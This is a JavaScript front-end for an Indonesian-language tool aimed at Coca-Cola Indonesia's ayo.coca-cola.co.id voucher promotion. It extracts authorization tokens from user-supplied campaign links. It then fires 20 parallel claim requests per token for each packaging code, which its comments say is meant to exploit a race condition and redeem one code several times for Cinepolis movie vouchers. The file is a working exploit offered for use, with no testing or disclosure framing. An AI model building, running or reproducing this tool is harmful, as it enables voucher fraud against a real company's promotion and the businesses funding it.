// Toast notification function
function showToast(message, type = 'info') {
  // Remove existing toast if present
  const existingToast = document.getElementById('toast-notification');
  if (existingToast) {
    existingToast.remove();
  }
  
  // Create toast element
  const toast = document.createElement('div');
  toast.id = 'toast-notification';
  
  // Set styles based on type
  let bgColor, textColor, icon;
  switch (type) {
    case 'error':
      bgColor = 'bg-red-500';
      textColor = 'text-white';
      icon = `<svg class="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd"></path>
              </svg>`;
      break;
    case 'success':
      bgColor = 'bg-green-500';
      textColor = 'text-white';
      icon = `<svg class="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path>
              </svg>`;
      break;
    default:
      bgColor = 'bg-blue-500';
      textColor = 'text-white';
      icon = `<svg class="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"></path>
              </svg>`;
  }
  
  // Apply classes and add content
  toast.className = `fixed top-4 right-4 z-50 max-w-xs shadow-lg rounded-lg flex items-center p-4 ${bgColor} ${textColor} transform transition-all duration-300 ease-in-out`;
  toast.innerHTML = `
    <div class="flex items-center">
      ${icon}
      <span>${message}</span>
    </div>
    <button class="ml-4 focus:outline-none" onclick="this.parentElement.remove()">
      <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
        <path fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd"></path>
      </svg>
    </button>
  `;
  
  // Add to DOM
  document.body.appendChild(toast);
  
  // Add entrance animation
  setTimeout(() => {
    toast.style.transform = 'translateX(0)';
  }, 10);
  
  // Auto-remove after 5 seconds
  setTimeout(() => {
    if (document.body.contains(toast)) {
      toast.style.opacity = '0';
      setTimeout(() => {
        if (document.body.contains(toast)) {
          toast.remove();
        }
      }, 300);
    }
  }, 5000);
}

// Function to extract token from Coca-Cola link
async function extractToken(cocaColaLink, isSecondLink = false) {
  try {
    const tokenStatus = document.getElementById('token-status');
    const extractionAttempt = document.getElementById('extraction-attempt');
    tokenStatus.classList.remove('hidden');
    
    const linkNumber = isSecondLink ? "kedua" : "pertama";
    extractionAttempt.textContent = `Mengekstrak token dari link ${linkNumber}...`;
    
    // Start a counter to show how long we've been trying
    let seconds = 0;
    const extractionTimer = setInterval(() => {
      seconds++;
      extractionAttempt.textContent = `Mengekstrak token dari link ${linkNumber}: ${seconds} detik...`;
    }, 1000);
    
    const response = await fetch('/api/extract-token', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ cocaColaLink })
    });
    
    // Clear the timer
    clearInterval(extractionTimer);
    
    if (!response.ok) {
      const errorData = await response.json();
      throw new Error(errorData.message || `Gagal mengambil kode dari link ${linkNumber}: ${response.status}`);
    }
    
    const data = await response.json();
    
    // Only hide the token status if this is the second link or there's no second link
    if (isSecondLink) {
      tokenStatus.classList.add('hidden');
    }
    
    if (!data.success) {
      throw new Error(data.message || `Gagal mengambil kode akses dari link ${linkNumber}`);
    }
    
    return data.token;
  } catch (error) {
    if (isSecondLink) {
      document.getElementById('token-status').classList.add('hidden');
    }
    throw error;
  }
}

// Function to determine the success message based on the response data
function getSuccessMessage(responseData) {
  try {
    // First check in the result.result structure (when data is in a nested format)
    if (responseData && 
        responseData.parsedData && 
        responseData.parsedData.result && 
        responseData.parsedData.result.campaign_public_settings && 
        responseData.parsedData.result.campaign_public_settings.public_name) {
      
      const publicName = responseData.parsedData.result.campaign_public_settings.public_name;
      
      // Check for specific public_name values
      if (publicName === "public-ayo-cola-utc-cinepolis-b1f1") {
        return "Mendapatkan Voucher Cinepolis B1G1";
      } else if (publicName === "public-ayo-cola-utc-cinepolis-free") {
        return "Mendapatkan 1 Voucher Gratis Cinepolis";
      }
    }
    
    // Also check directly in the response structure (when data is directly in result)
    if (responseData && 
        responseData.result && 
        responseData.result.campaign_public_settings && 
        responseData.result.campaign_public_settings.public_name) {
      
      const publicName = responseData.result.campaign_public_settings.public_name;
      
      // Check for specific public_name values
      if (publicName === "public-ayo-cola-utc-cinepolis-b1f1") {
        return "Mendapatkan Voucher Cinepolis B1G1";
      } else if (publicName === "public-ayo-cola-utc-cinepolis-free") {
        return "Mendapatkan 1 Voucher Gratis Cinepolis";
      }
    }
    
    // Default case - return a generic success message
    return "Berhasil claim kode";
  } catch (error) {
    console.error("Error parsing success message:", error);
    return "Berhasil claim kode";
  }
}

// New function to claim a code with parallel requests to exploit race conditions
async function claimCodeParallel(packagingCode, authorizations, codeIndex = 0, totalCodes = 1) {
  try {
    // Get DOM elements for updating UI
    const resultDisplay = document.getElementById('result-display');
    const attemptCounter = document.getElementById('attempt-counter');
    const progressBar = document.getElementById('progress-bar');
    
    // Update batch progress if we have multiple codes
    if (totalCodes > 1) {
      document.getElementById('batch-progress').classList.remove('hidden');
      document.getElementById('current-code-number').textContent = codeIndex + 1;
      document.getElementById('total-codes-number').textContent = totalCodes;
    }
    
    // Update the corresponding code badge if we can find it
    const codeElements = document.querySelectorAll('.packaging-code');
    if (codeElements[codeIndex]) {
      const badgeElement = codeElements[codeIndex].nextElementSibling;
      badgeElement.textContent = "Sedang Diproses";
      badgeElement.className = "ml-2 code-badge badge-processing";
    }
    
    // Update UI to show we're starting with this specific code
    attemptCounter.textContent = `Memproses kode ${codeIndex + 1}/${totalCodes}: ${packagingCode}`;
    
    // Create a realtime attempt status display that will be updated
    const realtimeStatusDiv = document.createElement('div');
    realtimeStatusDiv.id = `realtime-status-${codeIndex}`;
    realtimeStatusDiv.className = 'p-2 mb-2 bg-blue-100 text-blue-800 rounded';
    realtimeStatusDiv.innerHTML = `<span class="font-medium">Kode ${codeIndex + 1}: ${packagingCode} - Mempersiapkan race condition...</span>`;
    resultDisplay.prepend(realtimeStatusDiv);
    
    // Set up event source for real-time updates - disabled for parallel processing
    // We'll use our own counter for parallel requests
    let attemptNum = 0;
    const maxParallelRequests = 20; // Number of parallel requests per link
    
    // Results array to store responses for each token
    const results = [];
    const successResults = [];
    let processingComplete = false;
    
    // Update UI to show we're starting parallel processing
    realtimeStatusDiv.innerHTML = `<span class="font-medium">Kode ${codeIndex + 1}: ${packagingCode} - Mengirim ${maxParallelRequests} request paralel per link...</span>`;
    attemptCounter.textContent = `Mengirim ${authorizations.length * maxParallelRequests} request paralel untuk kode: ${packagingCode}`;
    
    // Arrays to track promises and their outcomes
    const allPromises = [];
    
    // Process each authorization token in parallel with multiple requests
    for (let i = 0; i < authorizations.length; i++) {
      const authorization = authorizations[i];
      const linkNumber = i + 1;
      
      // Status tracking for this link
      const linkStatusDiv = document.createElement('div');
      linkStatusDiv.className = 'mt-2 text-xs';
      linkStatusDiv.innerHTML = `<span class="font-medium">Link #${linkNumber}:</span> Mengirim ${maxParallelRequests} request paralel...`;
      realtimeStatusDiv.appendChild(linkStatusDiv);
      
      // Create an array of promises for parallel requests for this link
      const linkPromises = [];
      
      // Launch multiple parallel requests for the same code
      for (let j = 0; j < maxParallelRequests; j++) {
        const requestPromise = (async () => {
          try {
            // Make API call to our Express backend
            const response = await fetch('/api/claim', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({
                packagingCode,
                authorization
              })
            });
            
            if (response.ok) {
              const result = await response.json();
              
              // If this attempt was successful, add it to success results
              if (result.success) {
                successResults.push({ linkNumber, requestNumber: j + 1, result });
                
                // Update the link status div to show success
                linkStatusDiv.innerHTML = `<span class="font-medium text-green-600">Link #${linkNumber}:</span> Berhasil pada request ke-${j + 1}!`;
                
                // Get the success message
                const successMessage = getSuccessMessage(result.result);
                
                // Create a success notification
                const successNotif = document.createElement('div');
                successNotif.className = 'mt-1 text-xs bg-green-50 text-green-700 p-1 rounded';
                successNotif.innerHTML = `Request #${j + 1}: ${successMessage}`;
                linkStatusDiv.appendChild(successNotif);
              }
              
              return { linkNumber, requestNumber: j + 1, result, success: result.success };
            } else {
              return { 
                linkNumber, 
                requestNumber: j + 1,
                success: false, 
                error: `Error ${response.status}: ${response.statusText}` 
              };
            }
          } catch (error) {
            return { 
              linkNumber, 
              requestNumber: j + 1,
              success: false, 
              error: error.message 
            };
          }
        })();
        
        linkPromises.push(requestPromise);
        allPromises.push(requestPromise);
      }
      
      // When all requests for this link are done, update the UI
      Promise.all(linkPromises).then(linkResults => {
        const successCount = linkResults.filter(r => r.success).length;
        linkStatusDiv.innerHTML = `<span class="font-medium">Link #${linkNumber}:</span> ${successCount} dari ${maxParallelRequests} berhasil`;
        
        // For each successful request, show a success badge
        const successItems = linkResults.filter(r => r.success);
        if (successItems.length > 0) {
          const successListDiv = document.createElement('div');
          successListDiv.className = 'mt-1 flex flex-wrap gap-1';
          successItems.forEach(item => {
            const badge = document.createElement('span');
            badge.className = 'inline-block bg-green-100 text-green-800 text-xs px-1 rounded';
            badge.textContent = `#${item.requestNumber}`;
            successListDiv.appendChild(badge);
          });
          linkStatusDiv.appendChild(successListDiv);
        }
      });
    }
    
    // Wait for all requests to complete
    const allResults = await Promise.all(allPromises);
    
    // Update UI when all parallel requests are done
    realtimeStatusDiv.innerHTML = `<span class="font-medium">Kode ${codeIndex + 1}: ${packagingCode} - Proses paralel selesai</span>`;
    
    // Check if we had at least one success
    const hasSuccess = successResults.length > 0;
    
    // Remove the realtime status div
    if (document.getElementById(`realtime-status-${codeIndex}`)) {
      document.getElementById(`realtime-status-${codeIndex}`).remove();
    }
    
    // Update progress bar based on result
    const progressPercent = hasSuccess ? 
      ((codeIndex + 1) / totalCodes) * 100 : 
      ((codeIndex) / totalCodes) * 100 + (1 / totalCodes) * 30;
    progressBar.style.width = `${progressPercent}%`;
    
    // Create result entry
    const logEntry = document.createElement('div');
    
    // Update the corresponding code badge if we can find it
    if (codeElements[codeIndex]) {
      const badgeElement = codeElements[codeIndex].nextElementSibling;
      
      if (hasSuccess) {
        badgeElement.textContent = "Berhasil";
        badgeElement.className = "ml-2 code-badge badge-success";
      } else {
        badgeElement.textContent = "Gagal";
        badgeElement.className = "ml-2 code-badge badge-failed";
      }
    }
    
    if (hasSuccess) {
      // At least one success - show the combined result
      const successCount = successResults.length;
      const linkSuccessCounts = {};
      
      // Count successes per link
      successResults.forEach(r => {
        if (!linkSuccessCounts[r.linkNumber]) {
          linkSuccessCounts[r.linkNumber] = 0;
        }
        linkSuccessCounts[r.linkNumber]++;
      });
      
      // Generate summary message
      const linkSummaries = Object.keys(linkSuccessCounts).map(linkNum => {
        return `Link #${linkNum}: ${linkSuccessCounts[linkNum]} sukses`;
      }).join(', ');
      
      // Generate detailed success messages
      const allMessages = successResults.map((r, idx) => {
        const msg = getSuccessMessage(r.result.result);
        return `<div class="mt-1">✅ #${idx+1} - Link #${r.linkNumber}, Request #${r.requestNumber}: ${msg}</div>`;
      }).join('');
      
      logEntry.className = 'p-2 mb-2 bg-green-100 text-green-800 rounded';
      logEntry.innerHTML = `<strong>Kode ${codeIndex + 1}: ${packagingCode} - ${successCount} klaim berhasil! (${linkSummaries})</strong>${allMessages}`;
      
      if (codeIndex === totalCodes - 1 || totalCodes === 1) {
        // Only show toast for single code or the last code in batch
        showToast(`${successCount} klaim berhasil dengan race condition! (${linkSummaries})`, 'success');
      }
    } else {
      // All failed - show error message
      logEntry.className = 'p-2 mb-2 bg-red-100 text-red-800 rounded';
      logEntry.innerHTML = `<strong>Kode ${codeIndex + 1}: ${packagingCode} - Gagal dengan semua request paralel</strong>`;
      
      if (codeIndex === totalCodes - 1 || totalCodes === 1) {
        showToast('Gagal dengan semua request paralel', 'error');
      }
    }
    
    // Add the result to the display
    resultDisplay.prepend(logEntry);
    
    return { success: hasSuccess, results: allResults, successResults };
  } catch (error) {
    console.error('Error in parallel claim processing:', error);
    
    // Show error in the result display
    const resultDisplay = document.getElementById('result-display');
    const logEntry = document.createElement('div');
    logEntry.className = 'p-2 mb-2 bg-red-100 text-red-800 rounded';
    logEntry.textContent = `Error pada kode ${codeIndex + 1}: ${error.message}`;
    resultDisplay.prepend(logEntry);
    
    // Update badge if possible
    const codeElements = document.querySelectorAll('.packaging-code');
    if (codeElements[codeIndex]) {
      const badgeElement = codeElements[codeIndex].nextElementSibling;
      badgeElement.textContent = "Error";
      badgeElement.className = "ml-2 code-badge badge-failed";
    }
    
    // Update toast
    if (codeIndex === totalCodes - 1 || totalCodes === 1) {
      showToast(`Error: ${error.message}`, 'error');
    }
    
    return null;
  }
}

// Updated function to process multiple codes with race condition exploitation
async function processMultipleCodes(codes, tokens) {
  const totalCodes = codes.length;
  const progressBar = document.getElementById('progress-bar');
  const attemptCounter = document.getElementById('attempt-counter');
  
  // Set initial progress
  progressBar.style.width = '0%';
  attemptCounter.textContent = `Mempersiapkan ${totalCodes} kode dengan ${tokens.length} link untuk race condition...`;
  
  // Process each code sequentially, but with parallel requests for each
  for (let i = 0; i < codes.length; i++) {
    const code = codes[i].trim();
    if (code) {
      await claimCodeParallel(code, tokens, i, totalCodes);
    }
  }
  
  // Final progress update
  progressBar.style.width = '100%';
  attemptCounter.textContent = `Selesai memproses ${totalCodes} kode dengan race condition`;
  
  // Hide batch progress indicator
  document.getElementById('batch-progress').classList.add('hidden');
  
  // Re-enable the start button
  document.getElementById('start-button').disabled = false;
  document.getElementById('start-button').textContent = 'Mulai Claim';
}

// Variables to track link visibility state
let isLinkVisible = false;
let isLink2Visible = false;

// Function to mask the sensitive part of Coca-Cola link
function maskCokeLink(inputElement, displayElementId = 'masked-link-display') {
  const value = inputElement.value;
  const displayElement = document.getElementById(displayElementId);
  
  // Check if this is the first or second link to determine visibility
  const isVisible = displayElementId === 'masked-link-display' ? isLinkVisible : isLink2Visible;
  
  // If link is set to visible, don't mask anything
  if (isVisible) {
    displayElement.style.display = 'none';
    inputElement.style.color = '';
    return;
  }
  
  // Check if the link follows the expected pattern
  if (value && value.includes('/s/')) {
    const parts = value.split('/s/');
    const domain = parts[0] + '/s/';
    const id = parts[1];
    
    // Create a masked version where we show only the domain part
    // and replace the ID part with asterisks
    if (id) {
      // Show the real input as invisible but put a masked overlay
      displayElement.innerHTML = `${domain}<span class="font-bold text-black">${'•'.repeat(Math.min(id.length, 10))}</span>`;
      displayElement.style.display = 'flex';
      
      // Make sure we're not covering any text that's being typed
      inputElement.style.color = 'transparent';
      inputElement.style.caretColor = '#4b5563'; // Make the cursor visible
    } else {
      // If there's no ID part yet, just show the domain
      displayElement.innerHTML = domain;
      displayElement.style.display = 'flex';
      inputElement.style.color = 'transparent';
      inputElement.style.caretColor = '#4b5563';
    }
  } else {
    // If it doesn't match our pattern, show the raw input
    displayElement.style.display = 'none';
    inputElement.style.color = '';
  }
}

// Function to toggle link visibility
function toggleLinkVisibility(inputId = 'coca-cola-link', displayId = 'masked-link-display', showIconId = 'show-link-icon', hideIconId = 'hide-link-icon') {
  const linkInput = document.getElementById(inputId);
  const showIcon = document.getElementById(showIconId);
  const hideIcon = document.getElementById(hideIconId);
  const maskedDisplay = document.getElementById(displayId);
  
  // Toggle visibility state based on which link we're toggling
  if (inputId === 'coca-cola-link') {
    isLinkVisible = !isLinkVisible;
  } else {
    isLink2Visible = !isLink2Visible;
  }
  
  const isVisible = (inputId === 'coca-cola-link') ? isLinkVisible : isLink2Visible;
  
  if (isVisible) {
    // Show the actual link text
    linkInput.style.color = '';
    maskedDisplay.style.display = 'none';
    showIcon.classList.add('hidden');
    hideIcon.classList.remove('hidden');
  } else {
    // Re-mask the link
    showIcon.classList.remove('hidden');
    hideIcon.classList.add('hidden');
    maskCokeLink(linkInput, displayId);
  }
}

// Initialize UI when document is loaded
document.addEventListener('DOMContentLoaded', function() {
  const startButton = document.getElementById('start-button');
  const linkInput = document.getElementById('coca-cola-link');
  const linkInput2 = document.getElementById('coca-cola-link-2');
  const addCodeButton = document.getElementById('add-code-button');
  
  // Always ensure right-clicking is enabled on mobile
  if (isMobileDevice) {
    document.body.oncontextmenu = function() { return true; };
  }
  
  // Click event for the add code button
  addCodeButton.addEventListener('click', function() {
    const codeContainer = document.getElementById('packaging-codes-container');
    const codeInputs = codeContainer.querySelectorAll('.packaging-code');
    
    // Limit to maximum 3 codes
    if (codeInputs.length < 3) {
      // Create a new code input field with badge
      const codeInputWrapper = document.createElement('div');
      codeInputWrapper.className = 'flex items-center';
      
      const codeInput = document.createElement('input');
      codeInput.type = 'text';
      codeInput.className = 'packaging-code w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-red-500 focus:border-red-500';
      codeInput.placeholder = 'Masukkan kode tambahan';
      
      const badge = document.createElement('span');
      badge.className = 'ml-2 code-badge badge-waiting';
      badge.textContent = 'Menunggu';
      
      // Remove button
      const removeButton = document.createElement('button');
      removeButton.type = 'button';
      removeButton.className = 'ml-2 text-red-500 hover:text-red-700 focus:outline-none';
      removeButton.innerHTML = `
        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
          <path fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd" />
        </svg>
      `;
      
      removeButton.addEventListener('click', function() {
        codeInputWrapper.remove();
        // Show the add button again if we're under the limit
        if (codeContainer.querySelectorAll('.packaging-code').length < 3) {
          addCodeButton.style.display = '';
        }
      });
      
      // Add everything to the container
      codeInputWrapper.appendChild(codeInput);
      codeInputWrapper.appendChild(badge);
      codeInputWrapper.appendChild(removeButton);
      
      // Insert before the "Add code" button container
      codeContainer.insertBefore(codeInputWrapper, addCodeButton.parentElement);
      
      // Hide the add button if we've reached the limit
      if (codeContainer.querySelectorAll('.packaging-code').length >= 3) {
        addCodeButton.style.display = 'none';
      }
    }
  });
  
  // Click event for the start button
  startButton.addEventListener('click', async function() {
    try {
      const cocaColaLink = document.getElementById('coca-cola-link').value;
      const cocaColaLink2 = document.getElementById('coca-cola-link-2').value;
      const codeInputs = document.querySelectorAll('.packaging-code');
      
      // Collect all codes
      const packagingCodes = [];
      for (const input of codeInputs) {
        const code = input.value.trim();
        if (code) {
          packagingCodes.push(code);
        }
      }
      
      if (!cocaColaLink || packagingCodes.length === 0) {
        showToast('Silakan isi link Coca-Cola utama dan minimal 1 Kode Kemasan', 'error');
        return;
      }

      // Validate that the first link is a valid Coca-Cola link
      if (!cocaColaLink.includes('ayo.coca-cola.co.id')) {
        showToast('Silakan masukkan link Coca-Cola yang valid untuk link utama', 'error');
        return;
      }
      
      // Validate the second link if provided
      if (cocaColaLink2 && !cocaColaLink2.includes('ayo.coca-cola.co.id')) {
        showToast('Link Coca-Cola kedua tidak valid', 'error');
        return;
      }
      
      // Clear any previous results first when starting a new claim
      document.getElementById('result-display').innerHTML = '<div class="text-gray-400 text-center">Memulai proses race condition...</div>';
      
      // Update button state
      this.disabled = true;
      this.textContent = 'Memproses Race Condition...';
      
      // Reset progress
      document.getElementById('progress-bar').style.width = '0%';
      document.getElementById('attempt-counter').textContent = 'Mengekstrak token...';
      
      // Extract tokens from both links
      const tokens = [];
      
      // Always extract token from the first link
      showToast('Mendapatkan token dari link pertama...', 'info');
      const token1 = await extractToken(cocaColaLink, false);
      if (!token1) {
        throw new Error('Gagal mendapatkan token dari link pertama');
      }
      tokens.push(token1);
      
      // Only extract from second link if provided
      if (cocaColaLink2) {
        showToast('Mendapatkan token dari link kedua...', 'info');
        try {
          const token2 = await extractToken(cocaColaLink2, true);
          if (token2) {
            tokens.push(token2);
          }
        } catch (error) {
          console.error('Error extracting second token:', error);
          showToast(`Error pada link kedua: ${error.message}. Hanya menggunakan link pertama.`, 'error');
        }
      }
      
      // Then start the claim process with the extracted tokens using race condition approach
      showToast(`${tokens.length} token berhasil diekstrak, memulai race condition dengan ${packagingCodes.length} kode...`, 'success');
      await processMultipleCodes(packagingCodes, tokens);
      
    } catch (error) {
      console.error('Process error:', error);
      showToast(`Error: ${error.message}`, 'error');
      
      // Re-enable the start button
      this.disabled = false;
      this.textContent = 'Mulai Claim';
    }
  });
  
  // Initialize the masking for the Coca-Cola link inputs
  if (linkInput.value) {
    maskCokeLink(linkInput);
  }
  if (linkInput2.value) {
    maskCokeLink(linkInput2, 'masked-link-display-2');
  }
  
  // Set up the visibility toggle for first link
  const toggleButton = document.getElementById('toggle-link-visibility');
  toggleButton.addEventListener('click', () => toggleLinkVisibility());
});